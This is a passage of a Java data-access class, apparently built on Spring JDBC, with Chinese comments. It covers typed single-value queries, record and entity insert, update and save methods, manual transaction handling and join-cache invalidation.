	 * 查询单个BigDecimal
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public BigDecimal queryBigDecimal(String sql, Object... params) {
		return DataParser.parseBigDecimal(queryObject(sql, params));
	}

	/**
	 * 查询单个BigDecimal
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public BigDecimal queryBigDecimal(String sql, Map<String, Object> params) {
		return DataParser.parseBigDecimal(queryObject(sql, params));
	}

	/**
	 * 查询单个Double值
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	@Override
	public Double queryDouble(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryDouble(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个Double值
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Double queryDouble(String sql, Object... params) {
		return DataParser.parseDouble(queryObject(sql, params));
	}

	/**
	 * 查询单个Double值
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public Double queryDouble(String sql, Map<String, Object> params) {
		return DataParser.parseDouble(queryObject(sql, params));
	}

	/**
	 * 查询单个Timestamp值
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	public Timestamp queryTimestamp(SQL sql) {
		return DataParser.parseTimestamp(queryObject(sql));
	}

	/**
	 * 查询单个Timestamp 值
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	public Timestamp queryTimestamp(String sql, Object... params) {
		return DataParser.parseTimestamp(queryObject(sql, params));
	}

	/**
	 * 查询单个Timestamp 值
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	public Timestamp queryTimestamp(String sql, Map<String, Object> params) {
		return DataParser.parseTimestamp(queryObject(sql, params));
	}

	/**
	 * 查询单个 Time 值
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	public Time queryTime(SQL sql) {
		return DataParser.parseTime(queryObject(sql));
	}

	/**
	 * 查询单个 Time 值
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	public Time queryTime(String sql, Object... params) {
		return DataParser.parseTime(queryObject(sql, params));
	}

	/**
	 * 查询单个 Time 值
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	public Time queryTime(String sql, Map<String, Object> params) {
		return DataParser.parseTime(queryObject(sql, params));
	}

	/**
	 * 查询单个字符串
	 *
	 * @param sql sql语句
	 * @return 值
	 */
	@Override
	public String queryString(SQL sql) {
		sql.setSQLDialect(this.getSQLDialect());
		return queryString(sql.getListParameterSQL(), sql.getListParameters());
	}

	/**
	 * 查询单个字符串
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public String queryString(String sql, Object... params) {
		return DataParser.parseString(queryObject(sql, params));
	}

	/**
	 * 查询单个字符串
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 值
	 */
	@Override
	public String queryString(String sql, Map<String, Object> params) {
		return DataParser.parseString(queryObject(sql, params));
	}

	/**
	 * 把记录插入到数据库
	 */
	public boolean insertRecord(Rcd r) {
		return insertRecord(r, r.getOwnerSet().getMetaData().getDistinctTableNames()[0]);
	}

	/**
	 * 把记录插入到数据库，表名自动识别
	 *
	 * @param r 记录
	 * @return 是否成功
	 */
	public boolean insertRecord(Rcd r, String table) {
		return insertRecord(r, table, true);
	}

	/**
	 * 把记录插入到数据库，表名自动识别
	 *
	 * @param r          记录
	 * @param table      数据表
	 * @param ignorNulls 是否忽略空值
	 * @return 是否成功
	 */
	public boolean insertRecord(Rcd r, String table, boolean ignorNulls) {
		Insert insert = SQLBuilder.buildInsert(r, table, this, ignorNulls);
		insert.setSQLDialect(this.getSQLDialect());
		Integer i = 0;
		if (insert.hasValue()) {
			i = this.execute(insert);
			if (i == 1) {
				r.clearDitryFields();
				r.setNextSaveAction(SaveAction.UPDATE);
			}
		}
		return i == 1;
	}

	/**
	 * 把记录从数据库删除
	 *
	 * @param r     记录
	 * @param table 数据表
	 * @return 是否成功
	 */
	public boolean deleteRecord(Rcd r, String table) {
		Delete delete = SQLBuilder.buildDelete(r, table, this);
		delete.setSQLDialect(this.getSQLDialect());
		Integer i = 0;
		if (!delete.isEmpty()) {
			i = this.execute(delete);
			if (i == 1) {
				r.clearDitryFields();
				r.setNextSaveAction(SaveAction.INSERT);
			}
		}
		return i == 1;
	}

	/**
	 * 把记录从数据库删除
	 *
	 * @param r 记录
	 * @return 是否成功
	 */
	public boolean deleteRecord(Rcd r) {
		return deleteRecord(r, r.getOwnerSet().getMetaData().getDistinctTableNames()[0]);
	}

	/**
	 * 把记录保存到数据库
	 *
	 * @param r        记录
	 * @param table    数据表
	 * @param saveMode 保存模式
	 * @return 是否成功
	 */
	public boolean updateRecord(Rcd r, String table, SaveMode saveMode) {
		Update update = SQLBuilder.buildUpdate(r, saveMode, table, this);
		Integer i = 0;
		if (update.hasValue()) {
			i = this.execute(update);
			if (i == 1) {
				r.clearDitryFields();
				r.setNextSaveAction(SaveAction.UPDATE);
			}
		}
		return i == 1;

	}

	/**
	 * 把记录保存到数据库
	 *
	 * @param r        记录
	 * @param saveMode 保存模式
	 * @return 是否成功
	 */
	public boolean updateRecord(Rcd r, SaveMode saveMode) {
		if (r.getOwnerSet() == null) {
			throw new DBMetaException("当前记录集不属于任何RcdSet,无法识别表名,请调用带表名参数的 updateRecord 方法");
		}
		String[] tables = r.getOwnerSet().getMetaData().getDistinctTableNames();
		if (tables.length != 1) {
			throw new DBMetaException("无法正确识别表名,无法识别表名,请调用带表名参数的 updateRecord 方法");
		}
		return updateRecord(r, tables[0], saveMode);
	}

	/**
	 * 保存记录，在确定场景下，建议使用insertRecord或updateRecord以获得更高性能
	 */
	public boolean saveRecord(Rcd r, SaveMode saveMode) {
		if (r.getNextSaveAction() == SaveAction.INSERT) {
			return this.insertRecord(r);
		} else if (r.getNextSaveAction() == SaveAction.UPDATE) {
			return this.updateRecord(r, saveMode);
		} else if (r.getNextSaveAction() == SaveAction.NONE) {
			boolean isExists = this.isRecordExits(r, true);
			r.setNextSaveAction(isExists ? SaveAction.UPDATE : SaveAction.INSERT);
			return saveRecord(r, saveMode);
		}
		return false;
	}

	/**
	 * 保存记录，在确定场景下，建议使用insertRecord或updateRecord以获得更高性能
	 */
	public boolean saveRecord(Rcd r, String table, SaveMode saveMode) {
		if (r.getNextSaveAction() == SaveAction.INSERT) {
			return this.insertRecord(r, table);
		} else if (r.getNextSaveAction() == SaveAction.UPDATE) {
			return this.updateRecord(r, table, saveMode);
		} else if (r.getNextSaveAction() == SaveAction.NONE) {
			boolean isExists = this.isRecordExits(r, table, true);
			r.setNextSaveAction(isExists ? SaveAction.UPDATE : SaveAction.INSERT);
			return saveRecord(r, table, saveMode);
		}
		return false;
	}

	/**
	 * 执行一个Insert语句，并返回某些默认值(自增),如果失败返回-1
	 *
	 * @param insert insert语句
	 * @return 默认字段的值
	 */
	public long insertAndReturnKey(SQL insert) {
		final String sql = insert.getListParameterSQL();
		final Object[] params = insert.getListParameters();
		return insertAndReturnKey(sql, params);
	}

	/**
	 * 执行一个Insert语句，并返回某些默认值,如果失败返回-1
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 默认字段的值
	 */
	public long insertAndReturnKey(final String sql, Map<String, Object> params) {
		return insertAndReturnKey(new Expr(sql, params).setSQLDialect(this.getSQLDialect()));
	}

	/**
	 * 执行一个Insert语句，并返回某些默认值,如果失败返回-1
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 默认字段的值
	 */
	public long insertAndReturnKey(String sql, Object... params) {

		if (sql.startsWith("#")) {
			sql = getSQL(sql);
		}

		Expr se = new Expr(sql, params);
		se.setSQLDialect(this.getDBType().getSQLDialect());
		latestSQL.set(se);
		SQL resultSql = chain.doFilter(se);
		resultSql.setSQLDialect(this.getDBType().getSQLDialect());

		sql = resultSql.getListParameterSQL();
		params = resultSql.getListParameters();

		KeyHolder keyHolder = new GeneratedKeyHolder();
		AutoIncPreparedStatementCreator cr = null;
		try {
			cr = new AutoIncPreparedStatementCreator(this, this.getDataSource().getConnection(), sql,
					Utils.filterParameter(params));
		} catch (SQLException e) {
			Logger.exception(e);
			return -1;
		}

		if (this.isPrintSQL()) {
			final AutoIncPreparedStatementCreator fcr = cr;
			new SQLPrinter<Object>(this, se, resultSql) {
				@Override
				protected Object actualExecute() {
					Integer r=getJdbcTemplate().update(fcr, keyHolder);
					return r;
				}
			}.execute();
		} else {
			try {
				getJdbcTemplate().update(cr, keyHolder);
			} catch (Exception e) {
				Logger.error("语句执行错误(" + e.getMessage() + ")，\n语句：" + se.getSQL());
				throw e;
			}
		}

		cr.close();

		//针对DB2的情况
		if (cr.getAutoAIKey() != null) {
			return cr.getAutoAIKey();
		}
		//尝试单个自增列的情况
		try {
			return keyHolder.getKey().longValue();
		} catch(Exception e) {
			Map<String,Object> ret=keyHolder.getKeys();
			List<String> tables = SQLParser.getAllTables(sql,DruidUtils.getDbType(this.getDBType()));
			if(tables.size()==1) {
				DBTableMeta tm=this.getTableMeta(tables.get(0));
				List<DBColumnMeta> ais=tm.getAIColumns();
				for (DBColumnMeta cm : ais) {
					Long value=DataParser.parseLong(ret.get(cm.getColumn()));
					if(value!=null) {
						return value;
					}
				}
			}
			throw e;
		}


	}

	/**
	 * 获得一个可执行的SE构建器，已经被设置DAO
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 表达式
	 */
	@Override
	public Expr expr(String sql, HashMap<String, Object> params) {
		Expr se = Expr.create(sql, params);
		se.setSQLDialect(this.getDBType().getSQLDialect());
		se.setDAO(this);
		return se;
	}

	/**
	 * 获得一个可执行的SE构建器，已经被设置DAO
	 *
	 * @param sql    sql语句
	 * @param params 参数
	 * @return 表达式
	 */
	@Override
	public Expr expr(String sql, Object... params) {
		if (sql.startsWith("#")) {
			sql = getSQL(sql);
		}
		Expr se = Expr.create(sql, params);
		se.setSQLDialect(this.getDBType().getSQLDialect());
		se.setDAO(this);
		return se;
	}

	/**
	 * 获得一个可执行的select语句构建器，已经被设置DAO
	 *
	 * @return Select
	 */
	@Override
	public Select select() {
		Select select = new Select();
		select.setDAO(this);
		select.setSQLDialect(this.getDBType().getSQLDialect());
		return select;
	}

	/**
	 * 获得一个可执行的insert语句构建器，已经被设置DAO
	 *
	 * @param table 表
	 * @return Insert
	 */
	@Override
	public Insert insert(String table) {
		Insert insert = new Insert(table);
		insert.setDAO(this);
		insert.setSQLDialect(this.getDBType().getSQLDialect());
		return insert;
	}

	@Override
	public Insert insert(Class entityType) {
		 String table=getEntityTableName(entityType);
		 if(StringUtil.isBlank(table)) {
			 throw new IllegalArgumentException("无发识别表名:"+entityType.getName());
		 }
		 return this.insert(table);
	}

	/**
	 * 获得一个可执行的update语句构建器，已经被设置DAO
	 *
	 * @param table 表
	 * @return Update语句
	 */
	@Override
	public Update update(String table) {
		Update update = new Update(table);
		update.setDAO(this);
		update.setSQLDialect(this.getDBType().getSQLDialect());
		return update;
	}

	@Override
	public Update update(Class entityType) {
		 String table=getEntityTableName(entityType);
		 if(StringUtil.isBlank(table)) {
			 throw new IllegalArgumentException("无发识别表名:"+entityType.getName());
		 }
		 return this.update(table);
	}

	/**
	 * 获得一个可执行的delete语句构建器，已经被设置DAO
	 *
	 * @param table 数据表
	 * @return Delete语句
	 */
	@Override
	public Update update(String table, ConditionExpr ce) {
		Update del = update(table);
		del.where().and(ce);
		del.setSQLDialect(this.getDBType().getSQLDialect());
		return del;
	}

	/**
	 * 获得一个可执行的update语句构建器，已经被设置DAO
	 *
	 * @param table 数据表
	 * @param ce    条件表达式
	 * @param ps    条件表达式参数
	 * @return Update语句
	 */
	@Override
	public Update update(String table, String ce, Object... ps) {
		return update(table, new ConditionExpr(ce, ps));
	}

	/**
	 * 获得一个可执行的delete语句构建器，已经被设置DAO
	 *
	 * @param table 数据表
	 * @return Delete语句
	 */
	@Override
	public Delete delete(String table) {
		Delete delete = new Delete();
		delete.from(table);
		delete.setDAO(this);
		delete.setSQLDialect(this.getDBType().getSQLDialect());
		return delete;
	}

	@Override
	public Delete delete(Class entityType) {
		 String table=getEntityTableName(entityType);
		 if(StringUtil.isBlank(table)) {
			 throw new IllegalArgumentException("无发识别表名:"+entityType.getName());
		 }
		 return this.delete(table);
	}

	/**
	 * 获得一个可执行的delete语句构建器，已经被设置DAO
	 *
	 * @param table 数据表
	 * @param ce    条件表达式
	 * @return Delete语句
	 */
	@Override
	public Delete delete(String table, ConditionExpr ce) {
		Delete del = delete(table);
		del.where().and(ce);
		del.setSQLDialect(this.getSQLDialect());
		return del;
	}

	/**
	 * 获得一个可执行的delete语句构建器，已经被设置DAO
	 *
	 * @param table 数据表
	 * @param ce    条件表达式
	 * @param ps    条件表达式参数
	 * @return Delete语句
	 */
	@Override
	public Delete delete(String table, String ce, Object... ps) {
		return delete(table, new ConditionExpr(ce, ps));
	}

	/**
	 * 获得数据库中的表清单
	 *
	 * @return 表清单
	 */
	@Override
	public String[] getTableNames() {
		DBTable[] tables = DBMetaData.getAllTableNames(this);
		String[] tabs=new String[tables.length];
		for (int i = 0; i < tables.length; i++) {
			tabs[i] = tables[i].name();
		}
		return tabs;
	}

	/**
	 * 获得数据库中的字段描述信息
	 *
	 * @param table  表名
	 * @param column 列名
	 * @return DBColumnMeta
	 */
	@Override
	public DBColumnMeta getTableColumnMeta(String table, String column) {
		table = this.getSQLDialect().getDialectProcessor().simplifyTableName(table);
		column = this.getSQLDialect().getDialectProcessor().simplifyTableName(column);
		return DBMetaData.getDBColumn(this, table, column);
	}

	/**
	 * 刷新全部 Meta 信息
	 */
	public void refreshMeta() {
		DBMetaData.invalid(this);
	}

	public void refreshMeta(String table) {
		DBMetaData.invalid(this,table);
	}


	private final ThreadLocal<TransactionStatus> MANUAL_TRANSACTION_STATUS=new ThreadLocal<TransactionStatus>();

	private String transactionManagerBean=null;

	private DataSourceTransactionManager transactionManager=null;

	/**
	 * 获得事务管理器
	 *
	 * @return 事务管理器
	 */
	public DataSourceTransactionManager getTransactionManager() {
		return transactionManager;
	}

	/**
	 * 设置事务管理器
	 *
	 * @param transactionManager 事务管理器
	 */
	public void setTransactionManager(DataSourceTransactionManager transactionManager) {
		this.transactionManager = transactionManager;
		validateDataSource(this.getDataSource());
	}

	/**
	 * 校验数据源
	 * */
	private void validateDataSource(DataSource ds) {
		if(this.getDataSource()==null) return;
		if(this.transactionManager==null) return;
		if(!(this.transactionManager instanceof DataSourceTransactionManager)) return;

		DataSourceTransactionManager tm=(DataSourceTransactionManager)this.transactionManager;
		if(tm.getDataSource()==null) {
			tm.setDataSource(ds);
		} else {
			if(tm.getDataSource()!=ds) {
				throw new TransactionException("事务管理器指定的数据源与当前数据源不一致");
			}
		}
	}

	/**
	 * 获得当前Spring托管的自动事务的事务状态对象
	 *
	 * @return 事务状态对象
	 */
	public TransactionStatus getCurrentAutoTransactionStatus()
	{
		try {
			return TransactionAspectSupport.currentTransactionStatus();
		} catch (NoTransactionException e) {
			 return null;
		}
	}

	/**
	 * 获得手动事务的事务状态对象
	 *
	 * @return 事务状态对象
	 */
	public TransactionStatus getCurrentManualTransactionStatus()
	{
		return MANUAL_TRANSACTION_STATUS.get();
	}

	public void beginTransaction()
	{
		beginTransaction(TransactionDefinition.PROPAGATION_REQUIRED);
	}

	/**
	 * 开始一个事务
	 *
	 * @param propagationBehavior 事务传播行为参数
	 */
	public void beginTransaction(int propagationBehavior)
	{
		if(transactionManager==null) {
			transactionManager=new DataSourceTransactionManager(this.getDataSource());
		}
		TransactionStatus  manualTransactionStatus=getCurrentManualTransactionStatus();
		if(manualTransactionStatus!=null) {
			throw new TransactionException("尚有事务为结束，无法启动新事务");
		}
		//事务定义类
		DefaultTransactionDefinition def = new DefaultTransactionDefinition();
	    def.setPropagationBehavior(propagationBehavior);
	    // 返回事务对象
	    TransactionStatus  status = transactionManager.getTransaction(def);
	    MANUAL_TRANSACTION_STATUS.set(status);
	}


	/**
	 * 回滚手动事务
	 */
	public void rollback()
	{
		if(transactionManager==null) {
			Logger.warn("未指定事务管理器，事务开启无效");
			return;
		}
		TransactionStatus  manualTransactionStatus=getCurrentManualTransactionStatus();
		if(manualTransactionStatus!=null) {
			transactionManager.rollback(manualTransactionStatus);
		}
		MANUAL_TRANSACTION_STATUS.set(null);
	}

	/**
	 * 提交手动事务
	 */
	public  void commit()
	{
		if(transactionManager==null) {
			Logger.warn("未指定事务管理器，事务开启无效");
			return;
		}
		TransactionStatus  manualTransactionStatus=getCurrentManualTransactionStatus();
		if(manualTransactionStatus!=null) {
			transactionManager.commit(manualTransactionStatus);
		}
		MANUAL_TRANSACTION_STATUS.set(null);
	}




	protected Insert createInsert4POJO(Object pojo,String table)
	{
		List<String> fields=EntityUtils.getEntityFields(pojo.getClass(),this,table);
		DBTableMeta tm= this.getTableMeta(table);
		if(fields.size()==0) return null;
		Insert  insert = new Insert(table);
		insert.setSQLDialect(this.getSQLDialect());
		Object value = null;
		DBColumnMeta cm=null;
		for (String field : fields) {
			value=BeanUtil.getFieldValue(pojo, field);
			if(DataParser.isBooleanType(value)) {
				if(this.getDBTreaty().isAutoCastLogicField()) {
					Boolean b=(Boolean)value;
					value= b? this.getDBTreaty().getTrueValue():this.getDBTreaty().getFalseValue();
				}
			}
			//校验主键是否为空
			cm= tm.getColumn(field);
			if(cm.isPK() && !cm.isAutoIncrease() && value==null) {
				throw new RuntimeException("未指定主键"+field+"的值");
			}
			if(value!=null) {
				insert.set(field, value);
			}
		}

		if(!insert.isEmpty()) {
			String field=this.getDBTreaty().getCreateUserIdField();
			if(tm.isColumnExists(field) && insert.getValue(field)==null) {
				insert.set(field, this.getDBTreaty().getLoginUserId());
			}
			field=this.getDBTreaty().getCreateTimeField();
			if(tm.isColumnExists(field) && insert.getValue(field)==null) {
				insert.set(field, new Date());
			}
			field=this.getDBTreaty().getVersionField();
			if(tm.isColumnExists(field) && insert.getValue(field)==null) {
				insert.set(field, 1);
			}
			field=this.getDBTreaty().getTenantIdField();
			SQL val=insert.getValue(field);
			if((val==null || val.isEmpty() || StringUtil.isBlank(val.getSQL())) && tm.isColumnExists(field)) {
				insert.set(field, this.getDBTreaty().getActivedTenantId());
			}
		}

		List<DBColumnMeta> aiColumns=tm.getAIColumns();

		insert.setSQLDialect(this.getSQLDialect());
		//针对DB2的特殊处理
		if(this instanceof Db2DAO) {
			for (DBColumnMeta aicolumn : aiColumns) {
				insert.removeField(aicolumn.getColumn());
			}
		}
		return insert;
	}

	/**
	 * 插入 entity 实体到数据里表
	 *
	 * @param entity  数据对象
	 * @return 是否执行成功
	 */
	public boolean insertEntity(Object entity) {
		if(entity==null) return false;
		return this.insertEntity(entity, getEntityTableName(entity.getClass()));
	}

	/**
	 * 插入 entity 实体到数据里表
	 *
	 * @param entities  数据对象
	 * @return 是否执行成功
	 */
	@Transactional
	public boolean insertEntities(List<? extends Entity> entities) {
		List<SQL> inserts=new ArrayList<>();
		String table=null;
		Class poType=null;
		for (Entity e : entities) {
			if(e==null) continue;
			if(table==null) table=getEntityTableName(e.getClass());
			if(poType==null) {
				poType=EntityContext.getProxyType(e.getClass());
			}
			Insert insert=createInsert4POJO(e,table);
			inserts.add(insert);
		}
		int[] rs=this.batchExecute(inserts);
		for (Entity entity : entities) {
			if(this.isCacheSupported(entity)) {
				getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.INSERT, table, null, (List<Entity>) entities);
			}
		}
		return true;
	}

	@Transactional
	public boolean updateEntities(List<? extends Entity> entities,SaveMode saveMode) {
		List<SQL> updates=new ArrayList<>();
		String table=null;
		Class poType=null;
		for (Entity e : entities) {
			if(e==null) continue;
			if(table==null) table=getEntityTableName(e.getClass());
			if(poType==null) {
				poType=EntityContext.getProxyType(e.getClass());
			}
			Update update=createUpdate4POJO(e,table,table,saveMode);
			updates.add(update);
		}
		int[] rs=this.batchExecute(updates);
		for (Entity entity : entities) {
			if(this.isCacheSupported(entity)) {
				getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.UPDATE, table, (List<Entity>) entities, (List<Entity>) entities);
			}
		}
		return true;
	}
	/**
	 * 插入 entity 实体到数据里表
	 *
	 * @param entity  数据对象
	 * @param table 数表
	 * @return 是否执行成功
	 */
	public boolean insertEntity(Object entity,String table)
	{
 		if(entity==null) return false;

		List<String> fields=EntityUtils.getEntityFields(entity.getClass(),this,table);
		DBTableMeta tm= this.getTableMeta(table);
		if(fields.size()==0) return false;

		Object value = null;
		boolean hasAIKey=false;
		DBColumnMeta cm = null;
		DBColumnMeta aiColumn=null;
		for (String field : fields) {
			//校验主键是否为空
			cm = tm.getColumn(field);
			if(cm.isPK()) {
				if(cm.isAutoIncrease()) {
					aiColumn=cm;
					hasAIKey=true;
				} else {
					value=BeanUtil.getFieldValue(entity, field);
					if(value==null) throw new RuntimeException("未指定主键"+field+"的值");
				}
			}
		}

		Insert insert=createInsert4POJO(entity, table);

		if(insert==null) return false;


		long i=-1;
		boolean suc =false;
		if(hasAIKey)
		{
			i=this.insertAndReturnKey(insert);
			//尝试设置主键值
			if(i!=-1) {
				if(tm.getPKColumns().size()==1) {
					BeanUtil.setFieldValue(entity,tm.getPKColumns().get(0).getColumn(),i);
				}
				suc=true;
			}
			EntityContext.clearModifies(entity);

		} else   {
			i=this.execute(insert);
			EntityContext.clearModifies(entity);

			//如果有缓存，有策略
//			if(this.getDataCacheManager()!=null && this.getDataCacheManager().isSupportAccurateCache(entity.getClass())) {
//				entity = this.queryEntity(entity,true);
////				this.getDataCacheManager().invalidateAccurateCache((Entity) entity);
//				this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.INSERT,this.getDataCacheManager(),table,null,(Entity) entity);
//			}
			suc=i==1;
		}


		if(suc) {
			//如果有缓存，有策略
			if( this.isCacheSupported(entity) ) {
				entity = this.queryEntity(entity,true);
//				this.getDataCacheManager().invalidateAccurateCache((Entity) entity);
				this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.INSERT,this.getDataCacheManager(),table,null,(Entity) entity);
			}
		}
		return suc;

	}

	/**
	 * 触发 insert 时的 join 缓存失效
	 * */
	public void invalidJoinCacheForInsert (Entity entity) {
		if(entity==null) return;
		if(!this.isCacheSupported(entity)) {
			return;
		}
		String table=this.getEntityTableName(entity.getClass());
		this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.INSERT,this.getDataCacheManager(),table,null,entity);
	}

	/**
	 * 触发 update 时的 join 缓存失效
	 * */
	public void invalidJoinCacheForUpdate (Entity entityBefore,Entity entityAfter) {
		if(entityBefore==null || entityAfter==null) return;
		if(!this.isCacheSupported(entityBefore)) {
			return;
		}
		String table=this.getEntityTableName(entityBefore.getClass());
		this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.UPDATE,this.getDataCacheManager(),table,entityBefore,entityAfter);
	}

	/**
	 * 触发 物理删除 时的 join 缓存失效
	 * */
	public void invalidJoinCacheForPhysicalDelete (Entity entity) {
		if(entity==null) return;
		if(!this.isCacheSupported(entity)) {
			return;
		}
		String table=this.getEntityTableName(entity.getClass());
		this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.DELETE,this.getDataCacheManager(),table,entity,null);
	}


	/**
	 * 触发 逻辑删除 时的 join 缓存失效
	 * */
	public void invalidJoinCacheForPhysicalDelete (Entity entityBefore,Entity entityAfter) {
		invalidJoinCacheForUpdate(entityBefore,entityAfter);
	}


	protected Update createUpdate4POJO(Object pojo,String table,String tableKey,SaveMode saveMode)
	{
		Entity entity=null;
		if((saveMode == SaveMode.BESET_FIELDS  || saveMode == SaveMode.DIRTY_FIELDS || saveMode == SaveMode.DIRTY_OR_NOT_NULL_FIELDS) && !EntityContext.isManaged(pojo)) {
			throw new IllegalArgumentException("SaveMode "+saveMode.name()+"错误 , 需要使用 EntityContext.create 方法创建实体");
		} else {
			try {
				entity=(Entity)pojo;
			} catch (Exception e) {
				saveMode=SaveMode.NOT_NULL_FIELDS;
				Logger.info(pojo.getClass().getName()+" is not Entity, save as "+saveMode.name()+" mode");
			}
		}

		List<String> fields=EntityUtils.getEntityFields(pojo.getClass(),this,table);
		if(fields.size()==0) return null;
		DBTableMeta tm= this.getTableMeta(table);
		Update  update = new Update(tableKey);
		update.setSQLDialect(this.getSQLDialect());
		Object value = null;
		//循环数据库字段
		for (String field : fields) {
			value=BeanUtil.getFieldValue(pojo, field);
			if(DataParser.isBooleanType(value)) {
				if(this.getDBTreaty().isAutoCastLogicField()) {
					Boolean b=(Boolean)value;
					value= b? this.getDBTreaty().getTrueValue():this.getDBTreaty().getFalseValue();
				}
			}
			if(tm.isPK(field)) {
				if(value==null) {
					throw new IllegalArgumentException("缺少主键["+table+"."+field+"]值");
				}
				update.where().and(field+" = ? ",value);
			}
			else {
				if(saveMode==SaveMode.ALL_FIELDS) {
					update.set(field, value);
				} else if(saveMode==SaveMode.NOT_NULL_FIELDS) {
					if(value!=null) update.set(field, value);
				} else if(saveMode==SaveMode.DIRTY_FIELDS) {
					if(entity.isDirtyProperty(NC.getPropertyName(field))) {
						update.set(field, value);
					}
				} else if(saveMode==SaveMode.DIRTY_OR_NOT_NULL_FIELDS) {
					if(value!=null || entity.isDirtyProperty(NC.getPropertyName(field))) {
						update.set(field, value);
					}
				} else if(saveMode==SaveMode.BESET_FIELDS) {
					if(entity.isBeSetProperty(NC.getPropertyName(field))) {
						update.set(field, value);
					}
				}
			}
		}

		if(!update.isEmpty()) {
			String field=this.getDBTreaty().getUpdateUserIdField();
			if(tm.isColumnExists(field) && update.getValue(field)==null) {
				update.set(field, this.getDBTreaty().getLoginUserId());
			}
			field=this.getDBTreaty().getUpdateTimeField();
			if(tm.isColumnExists(field) && update.getValue(field)==null ) {
				update.set(field, new Date());
			}
			field=this.getDBTreaty().getVersionField();
			if(tm.isColumnExists(field) && update.getValue(field)==null) {
				update.setExpr(field, field+"+1");
			}
		}

		//校验更新条件
		if(update.where().isEmpty()) {
			String[] pknames=BeanUtil.getFieldValueArray(tm.getPKColumns(), "column", String.class);
			throw new IllegalArgumentException("未指定主键值:"+ArrayUtil.join(pknames));
		}

		return update;
	}

	/**
	 * 根据ID值，更新pojo实体到数据里表,根据实体注解自动识别数据表<br>
	 * 如果ID值被修改，可导致错误的更新
	 *
	 * @param entity      数据对象
	 * @param saveMode 保存模式
	 * @return 是否执行成功
	 */
	public boolean updateEntity(Object entity,SaveMode saveMode)
	{
		if(entity==null) return false;
		return this.updateEntity(entity, getEntityTableName(entity.getClass()), saveMode);
	}


	private boolean isCacheSupported(Object entity) {
		DataCacheManager dcm=this.getDataCacheManager();
		if(entity==null || dcm==null) return false;
		Class clz=entity.getClass();
		return dcm.isSupportAccurateCache(clz) || dcm.isForJoinCacheDetection(clz);
	}

	/**
	 * 根据ID值，更新pojo实体到数据里表<br>
	 * 如果ID值被修改，可导致错误的更新
	 *
	 * @param entity      数据对象
	 * @param table     数表
	 * @param saveMode 保存模式
	 * @return 是否执行成功
	 */
	public boolean updateEntity(Object entity,String table,SaveMode saveMode)
	{
		if(entity==null) return false;
		Entity valueBefore=null;
		DataCacheManager dcm=this.getDataCacheManager();
		Boolean isLogicDelete=false;
		if (this.isCacheSupported(entity)) {
			valueBefore=(Entity) this.queryEntity(entity,true);
			DBTableMeta tm=this.getTableMeta(table);
			DBColumnMeta delcol=tm.getColumn(getDBTreaty().getDeletedField());
			if(delcol==null) isLogicDelete=false;
			else {
				Object delVal=BeanUtil.getFieldValue(entity,delcol.getColumn());
				isLogicDelete = getDBTreaty().getTrueValue().equals(delVal);
			}
		}
		Update update=createUpdate4POJO(entity, table,table, saveMode);
		update.setSQLDialect(this.getSQLDialect());
		if(update==null) return false;
		//如果没有字段要更新
		if(update.isEmpty()) return true;
		int i=this.execute(update);
		boolean suc= i==1;
		if(suc && ( entity instanceof Entity )) {
			((Entity)entity).clearModifies();
			if (this.isCacheSupported(entity)) {
				entity=this.queryEntity(entity,true);
				dcm.dispatchJoinCacheInvalidEvent(isLogicDelete?CacheInvalidEventType.DELETE:CacheInvalidEventType.UPDATE,this.getDataCacheManager(),table,valueBefore,(Entity) entity);
			}
		}
		return suc;

	}

	/**
	 * 保存实体数据，根据注解，自动识别表名<br>
	 * 建议使用insertEntity或updateEntity以获得更高性能
	 *
	 * @param entity      数据对象
	 * @param saveMode 保存模式
	 * @return 是否成功
	 */
	public boolean saveEntity(Object entity,SaveMode saveMode) {
		return this.saveEntity(entity, getEntityTableName(entity.getClass()), saveMode);
	}

	/**
	 * 保存实体数据<br>
	 * 建议使用insertPOJO或updatePOJO以获得更高性能
	 *
	 * @param entity      数据
	 * @param table     表
	 * @param saveMode 保存模式
	 * @return 是否成功
	 */
	public boolean saveEntity(Object entity,String table,SaveMode saveMode)
	{
		if(entity==null) {
			throw new DataException("不允许保存空的实体");
		}
		List<String> fields=EntityUtils.getEntityFields(entity.getClass(),this,table);
		DBTableMeta tm= this.getTableMeta(table);
		Object value = null;
		boolean isAnyPKNullValue=false;
		for (String field : fields) {
			value=BeanUtil.getFieldValue(entity, field);
			//校验主键是否为空
			DBColumnMeta cm= tm.getColumn(field);
			if(cm.isPK() && value==null) {
				isAnyPKNullValue=true;
				break;
			}
		}

		if(isAnyPKNullValue) {
			return insertEntity(entity, table);
		}

		if(isEntityExists(entity, table)) {
			return updateEntity(entity, table, saveMode);
		}
		else {
			return insertEntity(entity, table);
		}
	}

	/**
	 * 根据 sample 中的已有信息从数据库删除对应的实体集
	 *
	 * @param sample 查询样例
	 * @param sample  样例对象
	 * @return 删除的行数
	 */
